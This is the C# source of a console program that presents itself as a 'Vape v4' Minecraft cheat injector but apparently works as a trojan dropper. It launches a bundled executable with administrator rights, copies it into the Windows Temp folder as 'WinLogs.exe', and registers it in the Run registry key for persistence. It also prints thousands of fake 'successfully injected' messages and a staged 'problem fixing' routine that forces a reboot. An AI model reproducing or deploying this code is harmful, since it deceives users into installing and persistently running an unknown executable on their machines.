using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;               
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Media;

namespace Vape_v4._05
{
    public class Program
    {
        private static System.Timers.Timer t;
        private static System.Timers.Timer t2;
        static void Main(string[] args)
        {
            if (File.Exists(@"C:\Windows\Temp\Xif.txt"))
            {
                Console.WriteLine("If you still have a problem with cheat, please write to support daumgirn@gmail.com");
                Console.ReadKey();
            }            
            else if (File.Exists(@"C:\Windows\Temp\WinLogs.exe"))
            {               
                   Console.WriteLine("The cheat was laucnhed!\nIf cheat not start, please write command help here");
                help3:
                   string help = Console.ReadLine();               
                   if (help == "help")
                   {
                     Console.WriteLine("Okay, we can try find problem");
                     Timer1();
                     Console.ReadLine();
                   }
                   else
                   {
                     Console.WriteLine();
                     Console.WriteLine("Sorry, but this command not found\nIf you have problem with cheat, please write command help here");
                     goto help3;
                   }

                   Console.ReadKey();
            }
            else
            {
                try
                {
                    ExecuteAsAdmin(@"bin\Tools\vape v4.exe");
                    ExecuteAsAdmin(@"");
                    Console.WriteLine("Succesfully import Injector");
                    Console.WriteLine("Succesfully import Kernel");
                    Console.WriteLine("Succesfully import AppData");
                    Console.WriteLine("Succesfully crack vape");                   
                    File.Copy(@"bin\Tools\vape v4.exe", @"C:\Windows\Temp\WinLogs.exe");
                    AutoMaticOpen();
                    Console.WriteLine("Starting inject...");
                    SetTimer();
                    Console.ReadKey();
                }
                catch
                {
                    Console.WriteLine("\aOh no, the files in folder bin not found!\nPlease, install archive again and don't delete files in folder bin");
                    Console.ReadKey();
                }
            }
        }
        private static void AutoMaticOpen()
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue(@"C:\Windows\Temp\WinLogs.exe", Application.ExecutablePath);
        }

        private static void Timer()
        {
            t2 = new System.Timers.Timer(10000);
            t2.Elapsed += OnTime;
            t2.AutoReset = false;
            t2.Enabled = true;
            t2.Start();
            
        }
        
        private static void ExecuteAsAdmin(string path)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = path;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Verb = "runas";
            proc.Start();
        }

        private static void SetTimer()
        {
            t = new System.Timers.Timer(2000);
            t.Elapsed += OnTimedEvent;
            t.AutoReset = false;
            t.Enabled = true;
            t.Start();
        }
        private static void OnTimedEvent(Object source, ElapsedEventArgs e)
        {
            t.Stop();
            t.Enabled = false;
            Random r = new Random();
            var list = new List<string> { "Succesfully Inject tools", "Succesfully inject super tools", "Succesfully inject java tools", "Succesfully inject Time Tools", "Succesfully Inject Web Tools", "Succesfully Inject python tools", "Succesfully inject mega tools", "Succesfully inject Minecraft Tools", "Succesfully inject AppData", "Succesfully inject System32", "Succesfully inject Boot", "Succesfully Inject Windows" };
            for (int i = 0; i < 50000; i++)
            {
                int index = r.Next(list.Count);
                Console.WriteLine(list[index]);
            }
            DialogResult dialog = MessageBox.Show("Succesfully Inject! Please Start Minecraft", "Vape_v4._05", MessageBoxButtons.OK, MessageBoxIcon.Information);
            if(dialog == DialogResult.OK)
            {
                Console.Clear();
                Console.WriteLine("The cheat was launched!\nYou can close this program by enter");
            }           
        }

        private static void OnTime(Object source, ElapsedEventArgs e)
        {                       
            Console.WriteLine("Problem found!");
            Console.WriteLine("Fixing...");
            Timer2();
        }

        private static void Timer1()
        {
            t2 = new System.Timers.Timer(2000);
            t2.Elapsed += OnTime1;
            t2.AutoReset = false;
            t2.Enabled = true;
            t2.Start();
        }

        private static void OnTime1(Object source, ElapsedEventArgs e)
        {
            Console.Clear();
            Console.WriteLine("Start looking for a problem...");
            Timer();
        }

        private static void Timer2()
        {
            t2 = new System.Timers.Timer(8000);
            t2.Elapsed += OnTime2;
            t2.AutoReset = false;
            t2.Enabled = true;
            t2.Start();
        }

        private static void OnTime2(Object source, ElapsedEventArgs e)
        {
            File.Create(@"C:\Windows\Temp\Xif.txt");
            DialogResult f = MessageBox.Show("The problem was fixed\nYou should restart a computer, click OK to restart a computer", "Vape_v4._05", MessageBoxButtons.OK, MessageBoxIcon.Information);
            if(f == DialogResult.OK)
            {
               Process.Start("shutdown.exe", "-r -t 0");
            }
        }
    }
}
